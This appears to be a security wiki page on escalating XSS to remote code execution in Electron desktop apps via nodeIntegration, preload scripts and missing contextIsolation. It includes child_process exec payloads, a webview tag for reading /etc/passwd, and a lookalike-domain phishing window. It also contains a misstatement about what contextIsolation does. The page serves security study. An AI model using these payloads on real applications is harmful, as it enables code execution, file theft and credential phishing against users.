# XSS to RCE Electron Desktop Apps

Electron is **based on Chromium**, but it is not a browser. Certain principles and security mechanisms implemented by modern browsers are not in place.

Electron has 2 process types:

* Main Process
* Renderer Process

A **renderer process** will be a browser window loading a file:

```javascript
const {BrowserWindow} = require('electron');
let win = new BrowserWindow();

//Open Renderer Process
win.loadURL(`file://path/to/index.html`);
```

Settings of the **renderer process** can be **configured** in the **main process** inside the main.js file. Some of the configurations will **prevent the Electron application to get RCE** or other vulnerabilities if the **settings are correctly configured**.

The desktop application might have access to the user’s device through Node APIs. The following two configurations are responsible for providing mechanisms to **prevent the application JavaScript from having direct access to the user’s device** and system level commands.

* **`nodeIntegration`** - is `off` by default. If on, allows to access node features from the renderer process.
* **`contextIsolation`** - is `on` by default. If on, main and renderer processes aren't isolated.
* **`preload`** - empty by default.

Example of configuration:

```javascript
const mainWindowOptions = {
  title: 'Discord',
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: 'EnumerateDevices,AudioOutputDevices',
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'mainScreenPreload.js'),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true
  }
};
```

## RCE: XSS + nodeIntegration

If the **nodeIntegration** is set to **on**, a web page's JavaScript can use Node.js features easily just by calling the `require()`. For example, the way to execute the calc application on Windows is:

```html
<script>
  require('child_process').exec('calc');
</script>
```

## RCE: preload

The script indicated in this setting is l**oaded before other scripts in the renderer**, so it has **unlimited access to Node APIs**:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

Therefore, the script can export node-features to pages:

{% code title="preload.js" %}
```javascript
typeof require === 'function';
window.runCalc = function(){
    require('child_process').exec('calc')
};
```
{% endcode %}

{% code title="index.html" %}
```html
<body>
    <script>
        typeof require === 'undefined';
        runCalc();
    </script>
</body>
```
{% endcode %}

{% hint style="info" %}
**If `contextIsolation` is on, this won't work**
{% endhint %}

## RCE: XSS + contextIsolation

The _**contextIsolation**_ introduces the **separated contexts between the web page scripts and the JavaScript Electron's internal code** so that the JavaScript execution of each code does not affect each. This is a necessary feature to eliminate the possibility of RCE.

If the contexts aren't isolated an attacker can:

1. Execute **arbitrary JavaScript in renderer** (XSS or navigation to external sites)
2. **Overwrite the built-in method** which is used in preload or Electron internal code to own function
3. **Trigger** the use of **overwritten function**
4. RCE?

There are 2 places where built-int methods can be overwritten: In preload code or in Electron internal code.

[electron-contextisolation-rce-via-preload-code.md](electron-contextisolation-rce-via-preload-code.md)
{% endcontent-ref %}



## Read Internal Files: XSS + contextIsolation

If `contextIsolation` set to false you can try to use \<webview> (similar to \<iframe> butcan load local files) to read local files and exfiltrate them: using something like  **\<webview src=”file:///etc/passwd”>\</webview>:**

## **XSS Phishing via Internal URL regex bypass**

Supposing you found a XSS but you **cannot trigger RCE or steal internal files** you could try to use it to **steal credentials via phishing**.

First of all you need to know what happen when you try to open a new URL, checking the JS code in the front-end:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

The call to ** `openInternally`** will decide if the **link** will be **opened** in the **desktop window** as it's a link belonging to the platform, **or** if will be opened in the **browser as a 3rd party resource**.

In the case the **regex** used by the function is **vulnerable to bypasses** (for example by **not escaping the dots of subdomains**) an attacker could abuse the XSS to **open a new window which** will be located in the attackers infrastructure **asking for credentials** to the user:

```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
